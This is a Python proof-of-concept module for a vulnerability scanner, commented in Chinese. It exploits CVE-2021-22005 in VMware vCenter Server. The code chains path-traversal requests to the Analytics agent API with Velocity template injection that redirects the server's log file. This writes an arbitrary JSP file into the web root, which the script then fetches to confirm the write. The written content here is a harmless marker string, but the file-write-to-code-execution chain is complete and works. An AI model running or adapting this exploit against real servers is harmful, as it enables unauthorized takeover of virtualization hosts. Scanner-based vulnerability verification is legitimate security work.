from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import string

POC_NAME = "CVE_2021_22005_VMWare_vCenter_Server_File_Upload"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同

class CVE_2021_22005_VMWare_vCenter_Server_File_Upload(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0048',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE-2021-22005 - VMWare vCenter Server File Upload to RCE',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-08',    # PoC创建时间
            },

        'vul': {
            'Product': 'VMWare vCenter Server',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'file upload to RCE',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。2021年9月22日，VMware 官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-09-09',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
            return ''.join(random.choice(chars) for _ in range(size))

        def str_to_escaped_unicode(arg_str):
            escaped_str = ''
            for s in arg_str:
                val = ord(s)
                esc_uni = "\\u{:04x}".format(val)
                escaped_str += esc_uni
            return escaped_str

        def createAgent(url, agent_name):
            burp0_url = url + "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c="+agent_name+"&_i="+pwd
            burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0", "X-Deployment-Secret": "abc", "Content-Type": "application/json", "Connection": "close"}
            burp0_json={"manifestSpec":{}, "objectType": "a2", "collectionTriggerDataNeeded":  True,"deploymentDataNeeded":True, "resultNeeded": True, "signalCollectionCompleted":True, "localManifestPath": "a7","localPayloadPath": "a8","localObfuscationMapPath": "a9"  }
            requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)

        pwd = id_generator(6)
        agent_name = id_generator(6)
        shell_name = id_generator(6)+".jsp"
        webshell = """Q291bGQgYmUgdnVsbiBieSBDVkUtMjAyMS0yMjAwNQ=="""
        webshell_location = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name
        webshell = str_to_escaped_unicode(webshell)

        manifestData = """<manifest recommendedPageSize="500">
            <request>
                <query name="vir:VCenter">
                    <constraint>
                    <targetType>ServiceInstance</targetType>
                    </constraint>
                    <propertySpec>
                    <propertyNames>content.about.instanceUuid</propertyNames>
                    <propertyNames>content.about.osType</propertyNames>
                    <propertyNames>content.about.build</propertyNames>
                    <propertyNames>content.about.version</propertyNames>
                    </propertySpec>
                </query>
            </request>
            <cdfMapping>
                <indepedentResultsMapping>
                    <resultSetMappings>
                    <entry>
                        <key>vir:VCenter</key>
                        <value>
                            <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                                <resourceItemToJsonLdMapping>
                                <forType>ServiceInstance</forType>
                                <mappingCode><![CDATA[    
                                #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                                #set($orig_log = $appender.getFile())##
                                #set($logger = $GLOBAL-logger.logger.parent)##     
                                $appender.setFile("%s")##     
                                $appender.activateOptions()##  
                                $logger.warn("%s")##   
                                $appender.setFile($orig_log)##     
                                $appender.activateOptions()##]]>
                                </mappingCode>
                                </resourceItemToJsonLdMapping>
                            </value>
                        </value>
                    </entry>
                    </resultSetMappings>
                </indepedentResultsMapping>
            </cdfMapping>
            <requestSchedules>
                <schedule interval="1h">
                    <queries>
                    <query>vir:VCenter</query>
                    </queries>
                </schedule>
            </requestSchedules>
        </manifest>""" % (webshell_location, webshell)

        print("[+] Target: " + target)
        print("[+] Creating Agent (of SHIELD) ...")
        createAgent(target, agent_name)
        print("[+] Collecting Agent (of SHIELD) ...")
        burp0_url = target+"/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c="+agent_name+"&_i="+pwd
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0", "X-Deployment-Secret": "abc", "Content-Type": "application/json", "Connection": "close"}
        burp0_json={"contextData": "a3", "manifestContent": manifestData, "objectId": "a2"}
        requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
        print("[+] upload test shell Success!")
        print("[+] test Shell location: " + target + "/idm/..;/" + shell_name)
        print("[+] Pwd: " + pwd)
        print("[+] Launch and requesting test shell ...")

        url = "%s/idm/..;/%s" % (target, shell_name)
        req1 = requests.get(url, verify=False, timeout=10)
        if req1.status_code == 200 and "Could be vuln by CVE-2021-22005" in req1.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = burp0_url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = req1.text
            if verbose:
                highlight("[+] Exploit CVE-2021-22005 VMWare vCenter Server File Upload success！！！")
        else:
            if verbose:
                highlight("[+] Exploit CVE-2021-22005 VMWare vCenter Server File Upload failed！！！")


    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)